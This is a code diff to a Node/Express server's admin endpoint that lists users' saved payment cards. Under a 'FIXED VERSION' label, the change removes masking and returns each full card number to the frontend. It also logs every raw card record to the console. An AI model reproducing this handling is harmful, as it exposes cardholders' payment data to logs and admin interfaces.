@@ -8843,10 +8843,7 @@ function getActivityDescription(action, metadata) {
 
 
 
-
-
-
-// Admin Get Saved Cards Endpoint
+// Admin Cards Endpoint - FIXED VERSION
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
   try {
     const page = parseInt(req.query.page) || 1;
@@ -8865,72 +8862,60 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
 
     console.log(`Found ${cards.length} cards`);
 
-    // Format the cards data to match frontend expectations
+    // Transform to match EXACT frontend table structure
     const formattedCards = cards.map(card => {
-      // Extract last 4 digits of card number safely
-      let last4 = '****';
-      if (card.cardNumber && card.cardNumber.length >= 4) {
-        last4 = card.cardNumber.slice(-4);
-      }
+      console.log('Processing card:', card);
       
-      // Extract expiry month and year safely
-      let expMonth = '**';
-      let expYear = '****';
-      if (card.expiryDate) {
-        const expiryParts = card.expiryDate.split('/');
-        if (expiryParts.length >= 2) {
-          expMonth = expiryParts[0].padStart(2, '0');
-          expYear = expiryParts[1];
-        }
-      }
+      // Extract user information with proper fallbacks
+      const user = card.user || {};
+      const userName = user.firstName && user.lastName 
+        ? `${user.firstName} ${user.lastName}`
+        : 'Unknown User';
 
-      // Get user name safely
-      let userName = 'Unknown User';
-      if (card.user) {
-        if (typeof card.user === 'object') {
-          userName = `${card.user.firstName || ''} ${card.user.lastName || ''}`.trim() || 'Unknown User';
-        }
-      }
+      // Extract card number safely (last 4 digits)
+      const cardNumber = card.cardNumber || '';
+      const last4 = cardNumber.length >= 4 
+        ? cardNumber.slice(-4) 
+        : '****';
 
+      // Extract expiry date safely
+      const expiryDate = card.expiryDate || '';
+      const [expMonth, expYear] = expiryDate.split('/');
+      
       // Format billing address
       const billingAddress = [
         card.billingAddress,
         card.city,
         card.state,
-        card.postalCode,
         card.country
-      ].filter(Boolean).join(', ') || 'No address provided';
+      ].filter(Boolean).join(', ') || 'Not provided';
 
       // Calculate last used time
-      const lastUsed = card.updatedAt || card.createdAt;
-      const now = new Date();
-      const diffMs = now - new Date(lastUsed);
-      const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
-      const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
-
-      let lastUsedText = 'Just now';
-      if (diffDays > 0) {
-        lastUsedText = `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;
-      } else if (diffHours > 0) {
-        lastUsedText = `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;
-      }
+      const lastUsed = card.createdAt 
+        ? formatActivityTime(card.createdAt)
+        : 'Never';
 
       return {
-        _id: card._id,
+        _id: card._id.toString(),
         user: {
-          firstName: card.user?.firstName || 'Unknown',
-          lastName: card.user?.lastName || 'User',
-          email: card.user?.email || 'Unknown'
+          _id: user._id || 'unknown',
+          firstName: user.firstName || '',
+          lastName: user.lastName || '',
+          email: user.email || '',
+          fullName: userName
         },
+        cardNumber: cardNumber,
         last4: last4,
-        expMonth: expMonth,
-        expYear: expYear,
-        name: card.fullName || 'Unknown Name',
+        expiryDate: expiryDate,
+        expMonth: expMonth || 'MM',
+        expYear: expYear || 'YYYY',
+        name: card.fullName || 'Not provided',
         billingAddress: billingAddress,
+        city: card.city || '',
+        state: card.state || '',
+        country: card.country || '',
         lastUsed: lastUsed,
-        lastUsedText: lastUsedText,
-        cardType: card.cardType || 'unknown',
-        status: card.status || 'processed'
+        createdAt: card.createdAt
       };
     });
 
@@ -8951,10 +8936,10 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
     });
 
   } catch (err) {
-    console.error('Admin get cards error:', err);
+    console.error('Admin cards error:', err);
     res.status(500).json({
       status: 'error',
-      message: 'Failed to fetch saved cards'
+      message: 'Failed to fetch cards data'
     });
   }
 });
@@ -9093,6 +9078,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
